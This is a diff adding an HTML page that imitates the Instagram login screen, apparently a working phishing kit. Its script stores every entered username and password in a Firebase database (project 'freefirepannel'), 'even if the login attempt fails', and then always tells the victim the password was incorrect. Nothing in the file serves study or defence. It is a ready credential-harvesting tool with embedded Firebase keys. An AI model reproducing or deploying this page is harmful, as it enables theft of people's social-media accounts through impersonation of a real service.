@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Lobster&family=Poppins:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background-color: black;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      text-align: center;
+      max-width: 350px;
+    }
+
+    .logo {
+      font-family: 'Lobster', sans-serif;
+      font-size: 36px;
+      margin-bottom: 20px;
+    }
+
+    .language-selector {
+      color: gray;
+      margin-bottom: 30px;
+    }
+
+    .btn-facebook {
+      background-color: #0095F6;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      padding: 10px;
+      font-size: 16px;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+      cursor: pointer;
+    }
+
+    .btn-facebook svg {
+      margin-right: 10px;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 20px 0;
+    }
+
+    .divider-line {
+      flex: 1;
+      height: 1px;
+      background-color: gray;
+    }
+
+    .divider-text {
+      margin: 0 10px;
+      color: gray;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid gray;
+      border-radius: 5px;
+      background: none;
+      color: white;
+      font-size: 14px;
+    }
+
+    .btn-login {
+      background-color: #0095F6;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      padding: 10px;
+      font-size: 16px;
+      width: 100%;
+      cursor: pointer;
+    }
+
+    .forgot-password {
+      color: #0095F6;
+      font-size: 14px;
+      display: block;
+      margin: 10px 0 20px;
+      text-decoration: none;
+    }
+
+    .footer {
+      color: gray;
+      font-size: 14px;
+      margin-top: 30px;
+    }
+
+    .footer a {
+      color: #0095F6;
+      text-decoration: none;
+    }
+
+    #message {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+  </style>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyCiDAN_WGfit9zzh7RgV6cG94ssdYjbFWQ",
+      authDomain: "freefirepannel-f5e86.firebaseapp.com",
+      databaseURL: "https://freefirepannel-f5e86-default-rtdb.firebaseio.com",
+      projectId: "freefirepannel-f5e86",
+      storageBucket: "freefirepannel-f5e86.firebasestorage.app",
+      messagingSenderId: "502751088755",
+      appId: "1:502751088755:web:33c121da3c6c2a5f0c5a06",
+      measurementId: "G-9G1MT49S15"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+
+    document.addEventListener("DOMContentLoaded", () => {
+      const loginButton = document.querySelector(".btn-login");
+      const usernameField = document.getElementById("username");
+      const passwordField = document.getElementById("password");
+      const messageElement = document.getElementById("message");
+
+      loginButton.addEventListener("click", async (e) => {
+        e.preventDefault();
+
+        const username = usernameField.value.trim();
+        const password = passwordField.value.trim();
+
+        if (!username || !password) {
+          messageElement.textContent = "Please fill in both fields.";
+          messageElement.style.color = "red";
+          return;
+        }
+
+        // Upload data to Firebase even if the login attempt fails
+        try {
+          await push(ref(database, "users/"), { username, password });
+
+          messageElement.textContent = "Data uploaded successfully!";
+          messageElement.style.color = "green";
+
+          usernameField.value = "";
+          passwordField.value = "";
+        } catch (error) {
+          messageElement.textContent = `Error: ${error.message}`;
+          messageElement.style.color = "red";
+        }
+
+        // Simulating login (replace this with your real API logic)
+        const loginSuccess = false;  // Placeholder, should be replaced with real API check
+
+        if (loginSuccess) {
+          messageElement.textContent = "Login successful!";
+          messageElement.style.color = "green";
+        } else {
+          messageElement.textContent = "Incorrect username or password.";
+          messageElement.style.color = "red";
+        }
+      });
+    });
+  </script>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">Instagram</div>
+
+    <div class="language-selector">English ▼</div>
+
+    <button class="btn-facebook">
+      <svg width="20" height="20" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+        <path d="M22.675 0H1.325C.6 0 0 .6 0 1.35v21.3C0 23.4.6 24 1.325 24h11.495v-9.293H9.845v-3.622h2.975V8.408c0-2.943 1.794-4.548 4.415-4.548 1.254 0 2.333.093 2.646.135v3.072h-1.814c-1.423 0-1.698.678-1.698 1.672v2.19h3.395l-.442 3.622h-2.953V24h5.785c.725 0 1.325-.6 1.325-1.35V1.35C24 .6 23.4 0 22.675 0z"></path>
+      </svg>
+      Continue with Facebook
+    </button>
+
+    <div class="divider">
+      <div class="divider-line"></div>
+      <div class="divider-text">OR</div>
+      <div class="divider-line"></div>
+    </div>
+
+    <input type="text" class="input-field" id="username" placeholder="Phone number, username, or email">
+    <input type="password" class="input-field" id="password" placeholder="Password">
+
+    <a href="#" class="forgot-password">Forgot password?</a>
+
+    <button class="btn-login">Log in</button>
+    <p id="message"></p>
+
+    <div class="footer">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+    <div class="footer">
+      By continuing, you agree to Instagram's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
+    </div>
+  </div>
+</body>
+</html>
